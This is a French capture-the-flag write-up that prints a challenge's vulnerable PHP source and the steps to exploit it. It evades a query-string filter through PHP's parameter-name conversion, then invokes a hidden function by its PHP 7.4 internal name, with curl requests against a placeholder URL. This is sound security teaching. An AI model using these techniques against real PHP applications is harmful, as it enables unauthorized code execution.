# Solution

## Exploration
On se retrouve sur un serveur privé Habbo (HabboNight) qui semble être en maintenance.  
En regardant les sources de la page, un commentaire est présent:
```html
<!-- <a href="?source">View source</a> -->
```

Celui-ci nous donne accès au code PHP suivant:
```php
<?php
require_once 'flag.php';

/*

                         ______                     
 _________        .---"""      """---.              
:______.-':      :  .--------------.  :             
| ______  |      | :                : |             
|:______B:|      | |  $> php -v     | |             
|         |      | |  PHP 7.4       | |         
|         |      | |                | |         
|:_____:  |      | |  $> pwd        | |  
|    ==   |      | |  /var/www/html | |                 
|    ==   |      | :                : |             
|       O |      :  '--------------'  :             
|       o |      :'---...______...---'              
|       o |-._.-i___/'             \._              
|'-.____o_|   '-.   '-...______...-'  `-._          
:_________:      `.____________________   `-.___.-. 
                 .'.Q W E R T Y U I O P.'.     :___:
    fsc        .'.   A S D F G H J K L  .'.         
              :_______Z X C V B N M ,______:

*/

// View source
if(isset($_GET["source"])){
    highlight_file(__FILE__);
    die();
}

// Get params
$i_am_part_of_the_staff = $_GET["i_am_part_of_the_staff"] ?? "nop";
$staff_password = hash("sha256", trim($_GET["staff_password"] ?? ""));


// Die if not allowed
if(preg_match('/i_am_part_of_the_staff/i', $_SERVER['QUERY_STRING'])){
    die("Not allowed.");
}

function nop(){}

if($staff_password === "i_4m_a_v4l1d_sha256_ha5h_:D"){
    function staff_door(){
        echo "<script>alert('".flag."')</script>";
    }
}

if(isset($_GET["i_am_part_of_the_staff"])){
    $i_am_part_of_the_staff();
}

?>
```

A première vue, le site utilise `PHP 7.4`, et le webroot se trouve dans `/var/www/html`.  
Le script récupère deux paramètres: `$_GET["i_am_part_of_the_staff"]` et le sha256 de`$_GET["staff_password"]`.  
Ensuite, une condition vérifie si dans l'URL est présent la chaîne `i_am_part_of_the_staff`: si oui, le script se termine avec un message d'erreur.
Le sha256 du mot de passe envoyé va être vérifié avec un hash impossible à avoir: `i_4m_a_v4l1d_sha256_ha5h_:D`. Si le mot de passe est valide, une fonction est créée, ayant pour utilité d'afficher le flag. C'est notre finalité, nous y reviendrons après.
Enfin, si `$_GET["i_am_part_of_the_staff"]` est présent, le script exécute la fonction donnée.

## Bypass preg_match('/i_am_part_of_the_staff/i',...)
En PHP, certains caractères des clés dans $_REQUEST sont remplacés par des underscore (\_) selon [ce commentaire sur le site officiel de PHP](https://www.php.net/manual/en/language.variables.external.php#81080).  
Cela veut donc dire que `$_GET["i_am_part_of_the_staff"]` peut-être rempli avec le paramètre `i.am.part.of.the.staff` ou bien `i%20am%20part%20of%20the%20staff`.  
On peut afficher `phpinfo()` avec la requête suivante:
```bash
curl 'http://__URL__/?i.am.part.of.the.staff=phpinfo'
```

## Call `staff_door` function
En octobre 2023, @phithon_xg sort [ce tweet](https://x.com/phithon_xg/status/1711414421283831811). 
Il sort donc un [blogpost pour expliquer le processus de compilation dans php 7.4](https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html).  
Pour la faire courte, on peut appeler arbitrairement une fonction via le nom temporaire qui lui ait attribué sous la forme:
```php
%00<function_name><file_path>:<start_func_line_number>$<key>
```

Nous possédons tout, sauf <key>, que l'on va pouvoir "bruteforcer".  
```
<function_name>          = staff_door
<file_path>              = /var/www/html/index.php
<start_func_line_number> = 47
<key>                    = 0 à ??? (s'incrémente à chaque appel de la fonction)
```


En testant la requête suivante, le flag apparait avec une popup `alert`:
```bash
curl 'http://__URL__/?i.am.part.of.the.staff=%00staff_door/var/www/html/index.php:47$0'
```